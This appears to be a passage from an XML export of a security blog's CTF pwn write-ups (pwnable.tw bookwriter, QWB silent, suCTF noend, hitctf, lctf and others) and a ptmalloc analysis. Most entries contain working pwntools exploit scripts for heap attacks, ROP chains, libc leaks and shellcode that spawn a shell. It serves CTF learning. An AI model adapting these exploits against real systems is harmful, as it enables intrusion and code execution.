attack and house of orangepayload = ''payload = payload.ljust(0x400, '\x00') + p64(0) + p64(0x21) + p64(0x2300000010) + p64(0)vtable = heap_addr + 0x410 + 0x20 + 0xc0 + 0x10 + 0x8 # point to vtable itself# change top chunk to 0x61 size and forge the streamfake_stream = '/bin/sh\x00' + p64(0x61) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) # here is heap + 0x410 + 0x20fake_stream = fake_stream.ljust(0xa0, '\x00')fake_stream += p64(heap_addr + 0x410 + 0x20 + 0xc0 + 0x10)fake_stream = fake_stream.ljust(0xc0, '\x00')fake_stream += p64(1) + 2 * p64(0) # here is heap + 0x410 + 0x20 + 0xc0fake_stream += p64(vtable)payload += fake_streampayload += p64(2)payload += p64(3)payload += p64(libc.symbols['system'])Upgrade(p, len(payload), payload, 0x10, 6) Call Build() to trigger malloc(0x10) and get shell. 1234p.recvuntil('Your choice : ')p.sendline('1')p.interactive()p.close() Relevant Articlehttps://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/ http://tacxingxing.com/2018/01/10/house-of-orange/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>hitcon</tag>
        <tag>2016</tag>
        <tag>house</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable tw bookwriter writeup]]></title>
    <url>%2F2018%2F07%2F02%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvironment: I use 64 bit to make example. Condition: Control unsorted chunk’s bk pointer. Unsorted Bin uses FIFO strategy. Steps: Set free unsorted chunk’s pointer to target_addr - 0x10, this chunk will be the first free chunk in Unsorted Bin. Call malloc, the first free chunk will be put into the corresponding bin. Then the operations below will be performed: 1234victim = unsorted_bin(av)-&gt;bk = p;bck = victim-&gt;bk = target_addr - 0x10; // victim-&gt;bk is p-&gt;bkunsorted_bin(av)-&gt;bk = bck;bck-&gt;fd = unsorted_bin(av); // bck-&gt;fd is *(target_addr) So, use Unsorted Bin Attack can set target_addr’s value to main_arean+88. 0x02 FSOPFSOP(File-Stream Oriented Programming), like ROP and SROP, but it use FILE struct to construct the exploit chain. One of the use of FSOP is House Of Orange. FSOP mainly use _IO_ﬂush_all_lockp function, it flushes all standard I/O stream before process being terminated. It travels all FILE struct by element _chain pointer. The code: 123456789101112131415161718192021222324252627282930313233int _IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp; last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; // travel by _chain &#125; return result;&#125; According to the code above, _IO_flush_all_lockp which called by abort will call_IO_OVERFLOW (fp, EOF), and we can hijack 用_IO_OVERFLOW through FILE struct’s vtable. There are 3 situations that program will call abort: glibc abort exit function main return When there occurs some errors in malloc, it will call malloc_printerr and then malloc_printerr calls abort. This exploit makes advantage of changing _IO_list_all and forges vtable which includes _IO_OVERFLOW pointer. 1234567891011121314151617181920212223242526272829303132extern struct _IO_FILE_plus *_IO_list_all;struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;;typedef struct _IO_FILE FILE;struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* ... */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);&#125;; 0x03 Pwnable.tw bookwriterleak libc information and heap addressAt the beginning of the program, pwner needs to input the name of author on bss_0x602060 which behind the chunk_list(bss_0x6020A0). Pwner can input a string of length 0x40 without \x00, when program output the author’s name, the heap address leaks. In Edit() function, there are two lines of code following, in InputString() function, it doesn’t end up input string with \x00 which leads to larger string length. 12InputString((__int64)CHUNK_LIST[idx], SIZE_LIST[idx]);SIZE_LIST[idx] = strlen(CHUNK_LIST[idx]); The first part of expolit: 12345678910111213141516171819def pwn(): p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' p.recvuntil('Author :') # input auther name of length 0x40 without \x00 p.send('A' * 0x40) Add(p, 0x18, 'A' * 0x18) # 0 sleep(0.3) # extend size of chunk 0 Edit(p, 0, 'A' * 0x18) # overflow top chunk size and let its size to be 0xfe1 Edit(p, 0, '\x00' * 0x18 + '\xe1\x0f\0') # leak heap address by author name recv = Info(p, null, 0) heap_addr = u64(recv['old_author'][0x40:].ljust(8, '\x00')) - 0x10 print hex(heap_addr) But how to leak libc information while there is no free() in the program? When user malloc a chunk whose size is larger than top chunk, the program will call sysmalloc() and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with main_arena. 12345678910# trigger free in sysmalloc, now the top chunk size is 0xfe1Add(p, 0x1000, 'sunichi') # 1 0x1000 &gt; 0xfe1Add(p, 0x40, 'sunichi!') # 2# leak libc addressrecv = View(p, 2)main_arena_88 = u64(recv[8:].ljust(8, '\x00'))libc_base_addr = main_arena_88 - 0x3c4b78 - (1640 - 88)system_addr = libc_base_addr + libc.symbols['system']io_list_all_addr = libc_base_addr + libc.symbols['_IO_list_all'] unsorted bin attack and perform house of orange to get the shellNow, we know the heap and libc address and the next step is to perform unsorted bin attack. First, construct a chunk of size 0x61. When it comes to malloc(1), the fake chunk will be put into fastbin[4]. Use unsorted bin attack, _IO_list_all will be changed to main_arena+88. After the fake chunk being put into fastbin[4], the malloc() will continue to find the next free unsorted chunk. Because next chunk’s size is 0, malloc() then triggers printerr(). So the program searches the FILE struct from _IO_list_all whose value is already main_arena+88 and calls FILE_OVERFLOW(). The first FILE struct is invalid, and through the main_arena+88-&gt;_chain(main_arena+216), the program will find the next FILE struct whose address is fastbin[4]’s first chunk which is forged by pwner. So the following code will be triggered: 1FILE_OVERFLOW(fp, EOF) =&gt; system(fp) =&gt; system('/bin/sh') The last part of exploits: 123456789101112131415161718192021222324252627# Index overflow, the size of chunk[0] will be changed to heap address for i in range(0x3, 0x9): Add(p, 0x20, str(i) * 0x20) vtable_addr = heap_addr + 0x248 payload = 0x170 * '\x00' fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(io_list_all_addr - 0x10) # unsorted bin attack fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_addr + 0x250) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += p64(1) + 2 * p64(0) + p64(vtable_addr) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(system_addr) Edit(p, 0, payload) p.recvuntil('Your choice :') p.sendline(str(1)) p.recvuntil('Size of page :') p.sendline(str(0x10)) p.interactive() Relevant Articlehttps://bbs.pediy.com/thread-223334.htm http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/ http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF 2018 pwn noend writeup]]></title>
    <url>%2F2018%2F06%2F15%2Fsuctf18-pwn-noend%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 使用IDA查看程序，发现此题所存在的漏洞。 12345678910111213141516while ( 1 )&#123; do &#123; memset(&amp;s, 0, 0x20uLL); read(0, &amp;s, 0x1FuLL); size = strtoll(&amp;s, 0LL, 10); buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; write(1, buf, (unsigned __int16)size); write(1, &amp;unk_B54, 1uLL); &#125; while ( size &gt; 127 ); free(buf);&#125; 在进行malloc时，并未检查是否malloc成功，malloc失败会返回0，导致后续存在任意地址写\x00的漏洞。首先需要泄漏libc的地址。 1234567891011121314151617181920def sar(p, size, content): p.sendline(str(size)) sleep(0.3) p.send(content) sleep(0.3) p.recvuntil(content)def pwn(): p = process('./noend') one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] context.update(log_level='debug') sar(p, 0x20, 'sunichi') sar(p, 0x30, 'sunichi') sar(p, 0x7f, 'sunichi') sar(p, 0x20, 'A' * 8) recv = p.recvuntil('\n', drop=True) main_arena_addr = u64(recv[0:8]) libc_base_addr = main_arena_addr - 0x3c4b78 #malloc_hook = libc_base_addr + 0x3c4b10 free_hook = libc_base_addr + 0x3c67a8 根据free时，chunk合并的特性，能够使最后top chunk的fd和bk指向main_arena。malloc(0x20)后，其中的信息并不会清空，导致libc地址泄漏。 123p.sendline(str(main_arena_addr))sleep(0.3)p.clean() 申请一个非常大的chunk，使libc重新申请arena。使用前述同样的方法泄漏地址。 1234567sar(p, 0x20, 'sunichi')sar(p, 0x30, 'sunichi')sar(p, 0x7f, 'sunichi')sar(p, 0x20, 'A' * 8)recv = p.recvuntil('\n', drop=True)[0:8]top_chunk_ptr = u64(recv)top_chunk = u64(recv) + 0x888 泄漏的地址指向top chunk，在这使用硬编码计算伪造的top chunk与泄漏的地址的偏移。（本地没问题，不知道remote会不会有问题，等端午放完假再问问师傅） 12345sar(p, 0xf0, p64(libc_base_addr + one_gadget[3] + (free_hook - top_chunk - 0x10)) * (0xe8 / 8))p.sendline(str(top_chunk_ptr + 1))sleep(0.3)p.sendline()sleep(0.3) 接着对申请的chunk进行填充，填充的值为one_gadget_addr + (free_hook_addr - top_chunk_addr - 0x10)。继续申请一个很大的chunk，此时libc不会再有新的arena了，而是申请失败返回0，导致任意地址写入\x00。在这我们向指向top chunk的地址末位写入\x00，导致top chunk指针向前移动，指向了我们之前申请的chunk的content部分。此时，伪造top chunk完成。 1234p.sendline(str(free_hook - top_chunk - 0x10))sleep(0.3)p.sendline()sleep(0.3) malloc(free_hook - top_chunk - 0x10)，使得top chunk的size变为one_gadget_addr。同时top chunk的地址变为top_chunk_addr + free_hook - top_chunk - 0x10 = free_hook - 0x10，free_hook处被填入one_gadget_addr。随后获取shell。（注意地址对齐的问题） 123sar(p, 0x10, 'pwn')p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ptmalloc malloc_consolidate分析]]></title>
    <url>%2F2018%2F06%2F04%2Fptmalloc-malloc_consolidate%2F</url>
    <content type="text"><![CDATA[尝试做了下suCTF2018的noend，用到的泄漏的libc地址的方法之前未遇到过，顺带对malloc_consolidate的源代码进行了学习。 以下分析基于glibc-2.23进行。 在free中，当达到某些条件的时候，会调用malloc_consolidate进行fastbin的chunk的合并。 首先，函数检查prev_chunk是否处于使用中，如果空闲，进行合并。 123456if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -(long)prevsize); unlink(av, p, bck, fwd);&#125; 如果下一个chunk不是top_chunk，进行如下操作： 如果next_chunk空闲，合并next_chunk 如果next_chunk使用中，将next_chunk的prev_inuse位置为0 接着将本chunk放入unsorted bin中： 123first_unsorted = unsorted_bin-&gt;fd;unsorted_bin-&gt;fd = p;first_unsorted-&gt;bk = p; 如果本chunk不在small bin范围内，清空fd_nextsize和bk_nextsize。接着设置本chunk的属性： 1234set_head(p, size | PREV_INUSE);p-&gt;bk = unsorted_bin;p-&gt;fd = first_unsorted;set_foot(p, size); 如果下一个chunk是top_chunk，进行合并： 123size += nextsize;set_head(p, size | PREV_INUSE);av-&gt;top = p; 所以，当fastbin中有两个不同大小的chunk时，能使top chunk的bk和fd指向main_arena。]]></content>
      <tags>
        <tag>heap</tag>
        <tag>libc</tag>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent2 writeup]]></title>
    <url>%2F2018%2F04%2F16%2Fqwb18-pwn-silent2%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 此题与silent几乎完全一致，仅是在malloc的时候做了大小限制： 123if ( size != 0x10 &amp;&amp; size &lt;= 127 ) exit(0);v3 = malloc(size); 因此此题需要依靠unsorted bin和unlink漏洞进行利用。首先申请5个chunk： 12345New(0x100, 'Hack by sunichi') # chunk_0New(0x100, 'Hack by sunichi') # chunk_1New(0x100, 'Hack by sunichi') # chunk_2New(0x100, 'Hack by sunichi') # chunk_3New(0x100, 'Hack by sunichi') # chunk_4 随后free chunk_3、chunk_4： 12Delete(3) # size 0x110Delete(4) # size 0x110 构造payload，0x6020c0为程序保存申请的chunk的地址的列表，首先我们要确保能通过unlink的安全检查，因此与0x6020c0有关的两个地址需要相差0x8，其次我们需要利用unlink改写列表中的值，进而写入got表地址然后进行覆写，unlink能达到的效果是对目标地址（第3个p64）+0x18的位置上写入其自身，我们在这就可以将list[3]的值替换为list[0]的地址，因此第三个p64的地址为target_addr - 0x18。填充完后，伪造chunk，prev_size为0x100，size为0x100： 12payload = p64(0) + p64(0x101) + p64(0x6020c0 + 0x18 - 0x18) + p64(0x6020c0 + 0x18 - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(0x110)New(0x210, payload) # chunk_5 Double Free并且通过编辑chunk_3将list[0]改写为free@got，然后将system@plt写入free@got： 123Delete(4)Edit(3, p64(elf.got['free']))Edit(0, p64(elf.plt['system'])) 拿到shell： 1234New(0x100, '/bin/sh\x00') # chunk_6Delete(6) # Get shellp.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent writeup]]></title>
    <url>%2F2018%2F04%2F15%2Fqwb18-pwn-silent%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 使用IDA查看程序，发现此题存在Double Free，可以进行fastbin attack，并修改free@got的地址为system后获取shell。 该题一开始会执行下列指令： 1system("cat banner.txt"); 使用gdb进行调试的时候这里有一个坑（不过在这里调用了一次system应该是方便了后面的漏洞利用），gdb默认会去调试子进程，导致无法继续调试主进程，因此需要设置gdb： 1set follow-fork-mode parent 首先申请3个fastbin chunk： 123New(0x50, 'Hack by sunichi') # chunk_0New(0x50, 'Hack by sunichi') # chunk_1New(0x50, '/bin/sh\x00') # chunk_2 为什么要选取0x50作为chunk的大小？因为在got表起始地址附近，能作为fastbin chunk的size的数据只有0x602002处的0xe168000000000060。malloc函数被调用时，会使用unsigned int对size做类型转换，在这里size就被转换成了0x60，与我们申请的0x50（content）+0x10（chunk头）大小的chunk一致。 随后进行fastbin attack： 123Delete(0)Delete(1)Delete(0) 三次释放后，header -&gt; 0 -&gt; 1 -&gt; 0 -&gt; 0x00。接着我们申请fastbin chunk： 1234567New(0x50, p64(0x601ffa)) # 0x602002 - 8# header -&gt; 1 -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0x601ffaNew(0x50, 'A' * 14 + p64(elf.plt['system'])) # Overwrite free@got 接着调用system函数，由于我们第1次申请的chunk_2的content中为字符串/bin/sh，因此此时调用free(chunk_2)等于system(‘/bin/sh’)： 123Delete(2)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn250 DragonBall writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn250%2F</url>
    <content type="text"><![CDATA[此题的漏洞主要是在第4个选项，即wish函数中，在里面有栈溢出漏洞，能够利用栈溢出返回到任意地址中。用ida查看程序，需要集齐7龙珠才能许愿。初始有15元，购买1个龙珠5元，出售1个龙珠3元，在购买时进行下述检查： 1234if ( !money ) return puts("You don't have enough money.");money -= 5;++dragon_ball_num; 只要金钱不为0，就可以一直购买，因此先购买1个龙珠、卖出1个龙珠，然后再连续购买7个龙珠即可。 1234buy()sell()for i in range(0, 7): buy() 保护措施如下： 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 因此我们可以让程序返回到栈上去执行我们注入的shellcode。使用pattern获取返回值的偏移，为0xa4。wish函数中，两次输入长度分别为0x64和0x40，使用pwntool生成shellcode： 1asm(shellcraft.i386.linux.sh()) shellcode长度为44，两次输入有部分区域重叠，非重叠区域为0x68-0x38=48，刚好能够容纳得下shellcode，shellcode能完整的写入。为了使函数能够返回到栈上，我们需要泄漏栈地址信息。 1234567891011121314int wish()&#123; char v1; // [esp+0h] [ebp-68h] int v2; // [esp+30h] [ebp-38h] memset(&amp;v1, 0, 0x60u); if ( dragon_ball_num != 7 ) return puts("You can't make a wish."); printf("Tell me your wish: "); read_input_raw(&amp;v1, 0x68); printf("Your wish is %s, is it right?\n(Y/N) ", &amp;v1); read_input_raw(&amp;v2, 0x40); return puts("OK.");&#125; 第一次输入的0x68长度的字符串后正好是ebp地址，因此写入长为0x68的字符串即可让printf函数打印出ebp信息： 123456p.recvuntil('choice: ')p.sendline('4')payload = 'A' * 0x68p.sendline(payload)p.recvuntil(payload)ebp = u32(p.recv(4)) 获取栈信息后构造新的payload拿shell： 12345678p.recvuntil('choice: ')p.sendline('4')execve_sh = asm(shellcraft.i386.linux.sh())payload = execve_sh + 'A' * (0xa4 - len(execve_sh)) + p32(ebp - 0x88)p.sendline(payload)p.interactive()p.close() 0x88为main函数到shellcode的偏移，因为wish函数栈大小为0x68，main函数为0x20，因此此处为0x88。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn100&pwn200 writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn100%26pwn200%2F</url>
    <content type="text"><![CDATA[0x00 pwn100保护措施： 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) pwn100为简单的栈溢出： 123456789int vuln()&#123; char buf; // [esp+0h] [ebp-28h] puts("Welcome to pwn world!\nLeave your name:"); fflush(stdout); read(0, &amp;buf, 64u); // StackOverflow Here 64 -&gt; 40 return puts("bye~");&#125; 只要将vuln函数的返回地址覆盖掉即可，使其返回到flag函数中，同时还需要构造flag函数的参数： 123456789int __cdecl flag(int a1, int a2)&#123; if ( a1 != 0xDEADBEEF ) CheckFailed(); command = "cat flag"; if ( a2 != 0xC0FFEE ) CheckFailed(); return system(command);&#125; payload构造如下： 1payload = 'A' * 44 + p32(flag_addr) + p32(0xdeadbeef) + p32(0xdeadbeef) + p32(0xc0ffee) 0x01 pwn200保护措施 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 该程序先进行登录，再进行验证，验证通过后获得flag： 12345678910111213141516171819202122232425262728293031323334353637383940414243signed int login()&#123; signed int v1; // [esp+4h] [ebp-14h] int n; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] v1 = 255; printf("Username: "); n = read_input_raw((int)bss_username, 16); printf("Password: "); v3 = read_input_raw((int)bss_password, 32); if ( !strncmp(bss_username, "root", n) &amp;&amp; !strncmp(bss_password, "passwd_has_be_changed_in_remote_", v3) ) return 0; if ( !strncmp(bss_username, "lilac", n) &amp;&amp; !strncmp(bss_password, "a_password_you_know_uh_huh_^_^@!", v3) ) v1 = 16; return v1;&#125;signed int check()&#123; signed int v1; // [esp+Ch] [ebp-Ch] v1 = 0; if ( !strncmp(bss_username, "root", 4u) ) &#123; puts("Correct username!"); v1 = 1; &#125; else &#123; puts("Incorrect username!"); &#125; if ( !strncmp(bss_password, "passwd_has_be_changed_in_remote_", 32u) ) &#123; puts("Correct password!"); ++v1; &#125; else &#123; puts("Incorrect password!"); &#125; return v1;&#125; 可以看出，在login函数中，只对用户输入的长度的数据进行字符串比较；而在check函数中，则对整个0x20长的字符串进行比较。从这也可以看出实际的密码长度为0x20。因此此题进行32长度的字符串逐位爆破即可。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cyberearth xctf pwn stack writeup]]></title>
    <url>%2F2018%2F02%2F02%2Fcyberearth-xctf-pwn-stack%2F</url>
    <content type="text"><![CDATA[第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee(); 提供输入在gee函数内，buf长度为0x88，read读入上限为0x100，可以溢出，offset为140。 123char buf; // [esp+0h] [ebp-88h]puts("*...........................................................");return read(0, &amp;buf, 0x100u); // buf length 0x88 overflow 通过简单的实验可知，先前的signal和alarm可以被后来的signal和alarm所覆盖，因此首先通过溢出令alarm(2u)失效。 12345678910# waitprint p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')# disable alarm# 0x8048b5e call geepayload = 'a' * 140 + p32(alarm_plt) + p32(0x8048b5e) + p32(0)p.sendline(payload) 编写leak函数并进行泄漏： 123456789101112131415def leak(addr): payload = 'a' * 140 + p32(write_plt) + p32(0x8048b5e) + p32(1) + p32(addr) + p32(4) print p.recvuntil('...\n') p.send(payload) data = p.recv(4) # print data return datad = DynELF(leak, elf=ELF('./stack'), libcdb=False)execve_addr = d.lookup('execve', 'libc')print 'execve:' + hex(execve_addr)system_addr = d.lookup('system', 'libc')print 'system:' + hex(system_addr)libcbase_addr = d.bases()['/lib/i386-linux-gnu/libc.so.6']print 'libc base addr:' + hex(libcbase_addr) 在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取/bin/sh的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用system并通过read读入/bin/sh字符串，但失败（包括先调用start恢复栈帧）。 1234libc = ELF('./libc.so.6')binsh_offset = next(libc.search('/bin/sh'))print '/bin/sh offset:' + hex(binsh_offset)binsh_addr = libcbase_addr + binsh_offset 调用execve即可拿到shell： 1234payload = 'a' * 140 + p32(execve_addr) + p32(0xdeadbeef) + p32(binsh_addr) + p32(0) + p32(0)p.send(payload)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>xctf</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rctf 2015 welpwn writeup]]></title>
    <url>%2F2018%2F01%2F09%2Frctf15-welpwn%2F</url>
    <content type="text"><![CDATA[buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下 size data 0x10 s2 0x08 saved ebp 0x08 return address 0x400 buf 构造如下payload：1payload = 'a' * 24 + return_addr 由于字符串复制遇\x00终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的buf，所以需要利用buf进行控制。buf的前32字节为上述payload，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非\x00长度与pop4_addr相同，因此可以成功写入。leak函数设计如下： 12345678910def leak(addr): payload = 'a' * 24 + p64(pop4_addr) payload += p64(pop6_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(addr) + p64(1) payload += p64(call_addr) + 'a' * 56 payload += p64(start_addr) payload = payload.ljust(0x400, 'a') p.send(payload) data = p.recv(8) p.recv(0x400) return data 获取system地址后： 12345678payload = 'a' * 24 + p64(pop4_addr)payload += p64(pop6_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bss_addr) + p64(0)payload += p64(call_addr) + 'a' * 56payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)payload = payload.ljust(0x400, 'a')p.send(payload)p.send('/bin/sh\x00')p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>rctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lctf 2016 pwn100 writeup]]></title>
    <url>%2F2018%2F01%2F07%2Flctf16-pwn100%2F</url>
    <content type="text"><![CDATA[使用ida查看程序，在函数0x40063d中有read函数，读取用户输入的200个字节。接着调用puts函数输出。 12sub_40063D((__int64)&amp;v1, 200);return puts("bye~"); 存储用户输入的空间为0x40字节，所以用户输入会导致溢出。由于是64位程序，因此需要gadget来控制流。x64中，主要使用__libc_csu_init中的两段代码来进行参数传递和函数调用，这两段代码分别位于0x400740和0x40075a。 由于无libc，需要泄漏，通过pattern和rsp可知偏移为72： 123456789101112131415161718def leak(addr): payload = 'a' * 72 + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_addr) payload += 'a' * (200 - len(payload)) p.send(payload) p.recvuntil('~\n') prev_rv = '' data = '' while True: rv = p.recv(numb = 1, timeout = 0.1) if prev_rv == '\n' and rv == '': data = data[:-1] data += '\x00' break else: data += rv prev_rv = rv data = data[:4] return data 获取system函数地址后，只需要将/bin/sh写入再调用system函数即可，通过vmmap可知0x601000-0x602000可读/写： 1234567891011payload = 'a' * 72 + p64(0x40075a) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601000) + p64(0) + p64(0x400740) #0、1两个参数固定，0配合第二段代码的call，由于是call指令第三个参数用got，随后是read函数的三个参数，返回0x400740调用第二段代码payload += 'a' * 56 + p64(start_addr) #栈指针移动了56字节，填充56字节payload += 'a' * (200 - len(payload))p.send(payload)p.recvuntil('~\n')p.send('/bin/sh\x00')payload = 'a' * 72 + p64(pop_rdi) + p64(0x601000) + p64(system_addr) + p64(0xdeadbeef)payload += 'a' * (200 - len(payload))p.send(payload)p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2016</tag>
        <tag>lctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xdctf 2015 pwn200 writeup]]></title>
    <url>%2F2018%2F01%2F06%2Fxdctf15-pwn200%2F</url>
    <content type="text"><![CDATA[为栈溢出，溢出点为buf，长度0x6C，read可输入0x100。溢出偏移为112。 1read(0, &amp;buf, 0x100u); // buf length: 0x6C 因为无libc，因此需要通过泄漏获取libc信息来获取system函数地址： 12345678def leak(address): payload = 'a' * 112 + p32(write_plt) + p32(0x8048484) + p32(1) + p32(address) + p32(4) # 返回到0x8048484使得泄漏可以重复 p.send(payload) data = recv(4) return datad = DynELF(leak, elf=ELF('./xdctf15-pwn200'), libcdb=False)system_addr = d.lookup('system', 'libc') 接着调用start函数恢复栈： 1payload = 'a' * 112 + p32(start_addr) 调用read函数输入”/bin/sh”字符串，最后调用system函数： 1payload = 'a' * 112 + p32(read_plt) + p32(0x804856c) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>xctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.tw start writeup]]></title>
    <url>%2F2018%2F01%2F05%2Fpwnable-tw-start%2F</url>
